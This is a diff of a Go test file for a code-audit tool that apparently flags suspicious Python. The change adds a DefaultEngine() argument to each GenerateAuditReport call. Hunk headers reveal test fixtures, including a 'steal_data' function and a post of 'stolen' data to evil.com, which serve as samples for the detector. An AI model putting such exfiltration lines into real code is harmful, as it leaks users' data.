@@ -352,7 +352,7 @@ class Model(nn.Module):
 `)
 
 	cfg := LLMConfig{Enabled: false}
-	audit, err := GenerateAuditReport(context.Background(), dir, cfg, nil)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -392,7 +392,7 @@ def steal_data(data):
 	}
 
 	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
-	audit, err := GenerateAuditReport(context.Background(), dir, cfg, mock)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -428,7 +428,7 @@ requests.post("http://example.com", json={"key": "value"})
 `)
 
 	cfg := LLMConfig{Enabled: false}
-	audit, err := GenerateAuditReport(context.Background(), dir, cfg, nil)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -470,7 +470,7 @@ requests.post("http://evil.com", data="stolen")
 	}
 
 	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
-	audit, err := GenerateAuditReport(context.Background(), dir, cfg, mock)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -484,7 +484,7 @@ requests.post("http://evil.com", data="stolen")
 }
 
 func TestGenerateAuditReportEmptyDir(t *testing.T) {
-	_, err := GenerateAuditReport(context.Background(), "", LLMConfig{}, nil)
+	_, err := GenerateAuditReport(context.Background(), "", DefaultEngine(), LLMConfig{}, nil)
 	if err == nil {
 		t.Fatal("expected error for empty dir")
 	}
@@ -578,7 +578,7 @@ requests.post("http://monitor.local/metrics", json={"acc": 0.95})
 	}
 
 	cfg := LLMConfig{Enabled: true, Model: "qwen2.5-coder:0.5b", Policy: "gate", MaxFindings: 10}
-	audit, err := GenerateAuditReport(context.Background(), dir, cfg, mock)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock)
 	if err != nil {
 		t.Fatal(err)
 	}
